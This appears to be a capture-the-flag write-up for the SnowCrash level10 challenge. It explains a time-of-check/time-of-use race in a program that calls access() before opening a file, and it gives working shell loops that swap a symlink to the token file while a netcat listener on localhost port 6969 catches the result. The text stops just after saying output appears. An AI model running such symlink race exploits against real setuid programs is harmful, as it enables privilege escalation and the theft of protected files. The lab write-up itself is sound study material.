Apparently level10 check our permission with the function access

this function is vulnerable to timing , changing the file very fast with symlink and we will be able to read it
if we call acces with a file we have to right on, and then quickly swapping to token before the open we will be able to acces it

we also see socket etc..
and this string "Connecting to %s:6969 .."

so we know port is 6969 and we will select host : 127.0.0.1

we will open a second ssh terminal to the VM snowCrash and listen on port 6969

$nc -lk 6969

exploit is : 

$ touch /tmp/file
$ while :; do ln -fs /tmp/file /tmp/fake ; ln -fs /home/user/level10/token /tmp/fake; done &
$ while :; do ~/level10 /tmp/fake 127.0.0.1 &;  done

and on our other terminal running nc we have this output going
